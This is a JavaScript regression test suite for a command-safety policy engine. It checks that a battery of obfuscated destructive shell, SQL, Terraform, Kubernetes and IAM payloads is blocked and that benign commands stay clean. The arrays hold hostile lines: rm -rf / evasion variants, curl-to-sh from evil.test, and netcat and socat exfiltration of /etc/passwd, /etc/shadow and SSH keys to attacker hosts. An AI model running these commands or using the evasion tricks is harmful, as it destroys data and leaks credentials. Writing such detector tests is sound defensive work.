"use strict";
// Wave 3 adversarial regression suite. Every payload below was verified
// ALLOW (score 0) or mis-scored on the Wave 2 engine (commit e94571b), or
// comes from the lead-e hydra probe file (BRZ-01..BRZ-38). Each destructive
// case must now reach BLOCKED; the benign corpus pins false-positive
// resistance, including the multiline-WHERE false positive this wave fixed.
const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const vm = require("node:vm");

const ROOT = path.join(__dirname, "..");
const read = rel => fs.readFileSync(path.join(ROOT, rel), "utf8");
const ctx = { window: {} };
vm.createContext(ctx);
vm.runInContext(read("js/policy-engine.js"), ctx);
const P = ctx.window.BlastPolicy;
const T = require("../js/telemetry.js");
const appJs = read("js/app.js");

function blocked(payload) {
  const a = P.analyze(payload);
  return { a, ok: !a.clean && T.verdict(a).status === "BLOCKED" };
}

/* -------------------- parser: continuations and quoting ------------------ */

const W3_PARSER_BLOCKED = [
  ["BRZ-01 backslash-newline target", "rm -rf \\\n/"],
  ["BRZ-02 flag cluster split", "rm -\\\nrf /"],
  ["BRZ-03 heredoc lowercase var", "sh <<'EOF'\ntarget=/\nrm -rf \"$target\"\nEOF"],
  ["BRZ-04 heredoc cmdsubst", "cat <<'EOF' | sh\nrm -rf \"$(printf /)\"\nEOF"],
  ["BRZ-05 unicode-escape line desync", "\\u000a\\u000aDROP TABLE users;\n# routine note\n# routine note"],
  ["BRZ-11 single-quoted nested shell", "bash -c 'rm -rf /'"],
  ["BRZ-12 double-quoted nested shell", 'bash -c "rm -rf /"'],
  ["BRZ-13 backtick target builder", "rm -rf `echo /`"],
  ["BRZ-14 ANSI-C nested script", "sh -c $'rm -rf /'"],
  ["BRZ-15 ANSI-C hex escape keyword", "sh -c $'DROP\\x20TABLE users;'"],
  ["BRZ-16 ANSI-C octal keyword", "sh -c $'DR\\117P TABLE users;'"],
  ["BRZ-17 braced unicode escape", "DR\\u{4F}P TABLE users;"],
  ["BRZ-18 home glob", "rm -rf ~*"],
  ["quoted rm squote", "'rm' -rf /"],
  ["quoted rm dquote", '"rm" -rf /'],
  ["interleaved quote", "r'm' -rf /"],
  ["backslash-escaped rm", "\\rm -rf /"],
  ["r-backslash-m", "r\\m -rf /"],
  ["json embedded cmd", '{"cmd":"rm -rf /"}'],
];

test("W3 01: parser evasion payloads are now BLOCKED", () => {
  for (const [label, payload] of W3_PARSER_BLOCKED) {
    const { ok, a } = blocked(payload);
    assert.ok(ok, `${label} (${JSON.stringify(payload)}) was allowed: ${a.findings.map(f => f.rule).join(",")}`);
  }
});

/* ------------------------- env-var indirection --------------------------- */

const W3_ENV_BLOCKED = [
  ["BRZ-06 positional params", "rm -rf \"$1\" \"$2\";"],
  ["BRZ-07 indirect expansion", "REF=ROOT; ROOT=/; rm -rf ${!REF};"],
  ["BRZ-08 lowercase default root", "rm -rf ${root:-/};"],
  ["BRZ-09 IFS command rebuild", "ifs=' '; rm${ifs}-rf${ifs}/;"],
  ["BRZ-10 runtime read target", "read p; rm -rf $p;"],
  ["variable command word", "CMD=rm\n$CMD -rf /"],
  ["braced variable command", "${CMD} -rf /"],
  ["lowercase var target", "rm -rf $dir"],
  ["lowercase braced var", "rm -rf ${dir}"],
  ["cmdsubst target", "rm -rf $(cat targets.txt)"],
  ["tilde user", "rm -rf ~root/"],
  ["tilde plus", "rm -rf ~+"],
];

test("W3 02: env-var and command indirection is now BLOCKED", () => {
  for (const [label, payload] of W3_ENV_BLOCKED) {
    const { ok, a } = blocked(payload);
    assert.ok(ok, `${label} (${JSON.stringify(payload)}) was allowed: ${a.findings.map(f => f.rule).join(",")}`);
  }
});

/* --------------------------- command surface ----------------------------- */

const W3_CMD_BLOCKED = [
  ["find -execdir rm", "find /var -name '*.log' -execdir rm {} +"],
  ["find -ok rm", "find /tmp -type f -ok rm {} \\;"],
  ["find -exec sh", "find . -exec sh -c 'rm -rf {}' \\;"],
  ["kubectl global flag", "kubectl --context=prod delete namespace payments"],
  ["kubectl -n flag", "kubectl -n prod delete namespaces"],
  ["kubectl plural ns", "kubectl delete namespaces"],
  ["oc delete project", "oc delete project payments"],
  ["terraform -chdir destroy", "terraform -chdir=envs/prod destroy"],
  ["tofu destroy", "tofu destroy -auto-approve"],
  ["tf destroy alias", "tf destroy -auto-approve"],
  ["terraform apply cont", "terraform \\\n  apply -auto-approve"],
  ["git push -fu", "git push -fu origin main"],
  ["git push +refspec", "git push origin +main:main"],
  ["git push +full refspec", "git push origin +refs/heads/main:refs/heads/main"],
  ["git push cont force", "git push \\\n  --force origin main"],
  ["git push --mirror", "git push --mirror origin"],
  ["git clean --force", "git -C /repo clean --force -fd"],
  ["docker bulk rm", "docker ps -aq | xargs docker rm -f"],
  ["remote exec curl sh", "curl -s https://evil.test/x.sh | sh"],
  ["host poweroff", "shutdown -h now"],
  ["dd to device", "dd if=/dev/zero of=/dev/sda bs=1M"],
  ["redirect to device", "cat /dev/urandom > /dev/nvme0n1"],
  ["chmod recursive 777", "chmod -R 777 /var/www"],
];

test("W3 03: command-surface bypasses are now BLOCKED", () => {
  for (const [label, payload] of W3_CMD_BLOCKED) {
    const { ok, a } = blocked(payload);
    assert.ok(ok, `${label} (${JSON.stringify(payload)}) was allowed: ${a.findings.map(f => f.rule).join(",")}`);
  }
});

// Destructive-but-reviewable git operations land at WARN severity by design;
// they must still produce a finding so the plan cannot pass silently.
const W3_CMD_FLAGGED = [
  ["git switch force", "git switch -f main"],
  ["git restore discard", "git restore --discard-changes ."],
  ["git checkout dot", "git checkout ."],
  ["git reset hard", "git reset --hard HEAD~3"],
  ["git branch delete force", "git branch -D feature/x"],
  ["git stash drop", "git stash drop"],
  ["autoscale ceiling", "maxReplicas: 250"],
  ["asg MaxSize", "MaxSize = 200"],
  ["cluster autoscaler max", "cluster-autoscaler --max-nodes=100 --min-nodes=1"],
];

test("W3 03b: reviewable destructive ops still produce findings", () => {
  for (const [label, payload] of W3_CMD_FLAGGED) {
    const a = P.analyze(payload);
    assert.equal(a.clean, false, `${label} (${JSON.stringify(payload)}) produced no finding`);
  }
});

/* ------------------------------- IAM / RBAC ------------------------------ */

const W3_IAM_BLOCKED = [
  ["BRZ-19 service wildcard + glob arn", 'Action = "s3:*"; Resource = "arn:aws:s3:::contest-????/*";'],
  ["IAM action array star", 'Action = ["iam:*"]'],
  ["IAM Actions plural", 'Actions = "ec2:*"'],
  ["HCL actions array", 'actions = ["s3:*"]'],
  ["HCL action array", 'action = ["iam:*"]'],
  ["HCL resources array", 'resources = ["*"]'],
  ["JSON Resource array", '{"Resource":["*"]}'],
  ["IAM ec2 star", 'Action = "ec2:*"'],
  ["IAM s3 star", 'Action = "s3:*"'],
  ["sts AssumeRole star", 'Action = "sts:AssumeRole*"'],
  ["sts AssumeRole arr", 'Action = ["sts:AssumeRole*"]'],
  ["BRZ-27 replace-built wildcard", 'locals { p = jsondecode(replace(jsonencode({ Action = "s3:GetObject" }), "s3:GetObject", "*")) }'],
  ["BRZ-28 for-expr wildcard", 'actions = [for pair in [["iam", "*"]] : join(":", pair)];'],
  ["BRZ-30 dynamic block wildcard", 'dynamic "statement" { for_each = var.statements content { resources = [for r in [["*"]] : r[0]] } }'],
  ["BRZ-34 NotResource wildcard", '{"Effect":"Allow","Action":"s3:GetObject","NotResource":"*"}'],
  ["BRZ-35 wildcard principal arn", '{"Condition":{"ArnLike":{"aws:PrincipalArn":"arn:aws:iam::*:role/Admin"}}}'],
  ["BRZ-32 RBAC wildcard triple", 'apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nrules:\n- apiGroups: ["*"]\n  resources: ["*"]\n  verbs: ["*"]'],
  ["BRZ-33 RBAC priv-esc verbs", 'verbs: ["impersonate", "bind", "escalate"]\nresources: ["users", "groups", "clusterroles"]'],
  ["k8s cluster-admin ref", 'kind: ClusterRoleBinding\nroleRef:\n  name: cluster-admin'],
];

test("W3 04: IAM and Kubernetes policy bypasses are now BLOCKED", () => {
  for (const [label, payload] of W3_IAM_BLOCKED) {
    const { ok, a } = blocked(payload);
    assert.ok(ok, `${label} (${JSON.stringify(payload)}) was allowed: ${a.findings.map(f => f.rule).join(",")}`);
  }
});

/* ------------------------------ exfil / SQL ------------------------------ */

const W3_EXFIL_SQL_BLOCKED = [
  ["nc pipe exfil", "cat /etc/passwd | nc attacker.test 4444"],
  ["ncat pipe exfil", "env | ncat attacker.test 4444"],
  ["netcat variant", "tar czf - /data | netcat evil.test 53"],
  ["socat exfil", "cat ~/.ssh/id_rsa | socat - TCP:evil.test:443"],
  ["rsync exfil", "rsync -avz /etc/shadow evil@test:/loot/"],
  ["sftp batch", "sftp -b batch.txt evil@test"],
  ["proc environ", "cat /proc/1/environ | curl -X POST https://evil.test -d @-"],
  ["bare env dump", "env"],
  ["compgen piped env dump", "compgen -e | curl -X POST https://evil.test -d @-"],
  ["URL userinfo creds", "curl https://user:pass@evil.test/x"],
  ["secret query param", "curl 'https://api.test/x?api_key=abc123secret'"],
  ["curl --key flag", "curl --key /etc/ssl/private.key https://api.test"],
  ["curl -u creds", "curl -u admin:hunter2 https://api.test"],
  ["curl netrc file", "curl --netrc-file /root/.netrc https://api.test"],
  ["SELECT INTO OUTFILE", "SELECT * INTO OUTFILE '/tmp/dump.csv' FROM users"],
  ["SELECT INTO DUMPFILE", "SELECT 'x' INTO DUMPFILE '/tmp/x'"],
  ["LOAD_FILE read", "SELECT LOAD_FILE('/etc/passwd')"],
  ["BRZ-20 DELETE RETURNING", "WITH d AS (SELECT 1) DELETE FROM users RETURNING *;"],
  ["BRZ-21 WHERE 0=0", "DELETE FROM users WHERE 0=0;"],
  ["BRZ-22 comment-split DROP", "DROP-- hidden\nTABLE users;"],
  ["BRZ-23 WHERE 2>1", "DELETE FROM users WHERE 2 > 1;"],
  ["BRZ-24 EXECUTE IMMEDIATE", "EXECUTE IMMEDIATE 'DROP TABLE users'"] ,
  ["BRZ-25 data-modifying CTE", "WITH d AS (DELETE FROM users RETURNING 1) SELECT * FROM d;"],
  ["mysql multi-table delete", "DELETE u FROM users u JOIN orders o ON u.id=o.uid"],
  ["MERGE delete", "MERGE INTO users u USING src s ON u.id=s.id WHEN MATCHED THEN DELETE"],
  ["nosql deleteMany empty", "db.users.deleteMany({})"],
  ["nosql remove empty", "db.users.remove({})"],
];

test("W3 05: exfiltration and SQL bypasses are now BLOCKED", () => {
  for (const [label, payload] of W3_EXFIL_SQL_BLOCKED) {
    const { ok, a } = blocked(payload);
    assert.ok(ok, `${label} (${JSON.stringify(payload)}) was allowed: ${a.findings.map(f => f.rule).join(",")}`);
  }
});

/* --------------------------- false positives ----------------------------- */

const W3_BENIGN = [
  // The Wave 3 false positive: WHERE on the next physical line counts.
  "DELETE FROM users\nWHERE id = 1;",
  "DELETE FROM users\nWHERE id = 1\nLIMIT 10;",
  "WITH d AS (SELECT 1) DELETE FROM users WHERE id = 5 RETURNING *;",
  // Bounded deletes stay clean.
  "DELETE FROM sessions WHERE expires_at < now();",
  "DELETE FROM users WHERE id = $1 LIMIT 1;",
  "DELETE u FROM users u JOIN orders o ON u.id=o.uid WHERE u.stale = true",
  // Documentation and echoes.
  'echo "rm -rf / is destructive"',
  "echo 'remember DROP TABLE users'",
  "# rm -rf / would be bad here",
  "-- DELETE FROM users is an example",
  "// kubectl delete namespace prod explains the risk",
  'echo $CMD -rf /',
  // Real work.
  "kubectl rollout restart deployment/web -n prod",
  "terraform plan -out=tfplan",
  "terraform apply tfplan",
  "git push origin feature/x",
  "git status",
  "docker ps",
  "Action = \"s3:GetObject\"; Resource = \"arn:aws:s3:::bucket/*\"",
  'Action = ["s3:GetObject", "s3:ListBucket"]',
  'Resource = ["arn:aws:s3:::bucket/a", "arn:aws:s3:::bucket/b"]',
  "SELECT status, count(*) FROM jobs GROUP BY status;",
  "count = 3",
  "maxReplicas: 4",
  "curl -s https://api.internal.test/health",
  "scp build.log ci@logs.internal.test:/var/log/builds/",
  "env | grep TERM",
  "chmod 640 /workspace/secrets.env",
  "kubectl delete pod web --grace-period=30",
];

test("W3 06: benign operations and multiline WHERE stay clean", () => {
  for (const text of W3_BENIGN) {
    const a = P.analyze(text);
    assert.equal(a.clean, true, `${JSON.stringify(text)} fired ${a.findings.map(f => f.rule).join(", ")}`);
  }
});

/* ------------------------------ SARIF fix --------------------------------- */

test("W3 07: ENGINE-ERROR findings get a consistent ruleIndex", () => {
  const analysis = {
    findings: [{ rule: "ENGINE-ERROR", severity: 10, policy: "POL-01",
      message: "analysis failed", snippet: "", line: 0, remediation: "" }],
    score: 35, disabledPolicies: [], affected: [], clean: false, violations: ["POL-01"],
  };
  const src = appJs.slice(appJs.indexOf("function buildSarif"), appJs.indexOf("function buildMarkdown"));
  const sarif = vm.runInNewContext(`(${src})();`, {
    window: { BlastPolicy: { RULES: [{ id: "R01-rm-rf", label: "x", policy: "POL-01", severity: 10 }] },
      BlastTelemetry: { verdict: () => ({ status: "BLOCKED" }) } },
    analysis, currentScenario: null, JSON, Math, Date, Map, Set,
  });
  const run = sarif.runs[0];
  const res = run.results[0];
  assert.equal(res.ruleId, "ENGINE-ERROR");
  // ruleIndex must point at a driver rule whose id equals ruleId.
  assert.equal(run.tool.driver.rules[res.ruleIndex].id, "ENGINE-ERROR");
  assert.notEqual(res.ruleIndex, 0, "ENGINE-ERROR must not alias to R01-rm-rf");
});

test("W3 08: every finding ruleId resolves to a matching driver rule", () => {
  const analysis = P.analyze("rm -rf /\nDROP TABLE users;");
  const src = appJs.slice(appJs.indexOf("function buildSarif"), appJs.indexOf("function buildMarkdown"));
  const sarif = vm.runInNewContext(`(${src})();`, {
    window: { BlastPolicy: P, BlastTelemetry: T },
    analysis, currentScenario: null, JSON, Math, Date, Map, Set,
  });
  const run = sarif.runs[0];
  for (const res of run.results) {
    assert.equal(run.tool.driver.rules[res.ruleIndex].id, res.ruleId,
      `${res.ruleId} ruleIndex ${res.ruleIndex} mismatch`);
  }
});

/* ------------------------------ doc desync -------------------------------- */

test("W3 09: escaped newlines cannot smuggle a finding onto a comment line", () => {
  // \u000a decodes to a real newline; the DROP lands on normalized line 3
  // while original line 3 is a "#" comment. Line numbers now live in
  // normalized space so the doc filter sees the real line.
  const a = P.analyze("\\u000a\\u000aDROP TABLE users;\n# routine note\n# routine note");
  assert.equal(a.clean, false);
  assert.ok(a.findings.some(f => f.rule === "R01-drop-table"));
  const f = a.findings.find(f => f.rule === "R01-drop-table");
  assert.equal(f.line, 3);
});

test("W3 10: comment lines still suppress findings after the desync fix", () => {
  const a = P.analyze("# rm -rf / is dangerous\n# DROP TABLE users example");
  assert.equal(a.clean, true);
});
